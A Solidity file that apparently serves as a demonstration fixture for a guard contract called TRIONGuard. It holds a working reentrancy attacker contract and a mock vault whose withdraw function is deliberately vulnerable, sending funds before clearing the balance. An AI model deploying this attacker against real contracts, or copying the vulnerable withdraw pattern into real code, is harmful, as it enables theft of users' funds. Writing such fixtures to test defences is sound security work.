// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TRIONGuard.sol";

/**
 * @title  ReentrancyAttacker
 * @notice Simulates an attacker that exploits a reentrancy flaw.
 *         Used in simulate-exploit.ts to demonstrate TRION interception.
 */
contract ReentrancyAttacker {
    VulnerableVault public target;
    uint256 public stolenAmount;

    constructor(address payable vault) {
        target = VulnerableVault(vault);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to seed attack");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
        stolenAmount += msg.value;
    }

    function getStolen() external view returns (uint256) {
        return stolenAmount;
    }
}

/**
 * @title  VulnerableVault
 * @notice Mock DeFi vault with an intentional reentrancy vulnerability.
 *         `withdraw()` is gated by `onlyWhenCoherent` — when TRION signals
 *         a behavioral anomaly the call reverts before a single wei can leave.
 */
contract VulnerableVault is TRIONGuard {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    constructor(address oracle) TRIONGuard(oracle) {}

    function deposit() external payable {
        require(msg.value > 0, "Must deposit ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev Intentionally vulnerable to reentrancy (external call before state clear).
     *      TRION intercepts before the call reaches this logic when in anomaly state.
     */
    function withdraw() external onlyWhenCoherent(keccak256(abi.encode(msg.sender, block.number))) {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, amount);
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
